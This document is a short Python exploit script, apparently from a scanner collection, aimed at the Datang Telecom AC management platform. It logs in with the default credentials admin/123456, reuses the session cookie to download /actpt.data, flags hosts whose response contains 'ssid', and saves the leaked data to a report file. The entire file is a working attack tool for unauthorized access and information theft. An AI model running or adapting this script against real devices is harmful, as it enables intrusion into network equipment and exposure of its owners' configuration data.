import requests
import time
import buter
import wirtefile

filename = "./reps/大唐电信AC管理平台弱口令登录及信息泄露-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
poc = '/login.cgi'
poc1 = '/actpt.data'
data ='user=admin&password1=%E8%AF%B7%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81&password=123456&Submit=%E7%AB%8B%E5%8D%B3%E7%99%BB%E5%BD%95'

def datangrklinformation(url):
    try:
        reps = requests.post(url=url + poc, headers=headers, data=data, verify=False, timeout=5)
        auth_s = str(reps.cookies.values()).replace("[", "").replace("]", "").replace("'", "")
        headers1 = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36",
            "Cookie": f"ac_userid={auth_s}"
        }
        repss = requests.get(url=url + poc1, headers=headers1, verify=False, timeout=5)
        if "ssid" in repss.text and repss.status_code == 200:
            print(buter.colors.GREEN+  f"存在大唐电信AC管理平台弱口令登录及信息泄露 url : {url} user:admin pwd:123456" + buter.colors.END)
            reptext = f"{url}\n{repss.text}"
            wirtefile.writefiles(filename,reptext)
        else:
            print(buter.colors.RED+ f"未发现大唐电信AC管理平台弱口令登录及信息泄露 url : {url} " + buter.colors.END)
    except Exception as e:
        print(buter.colors.END+f"ERROR : {e}"+buter.colors.END)
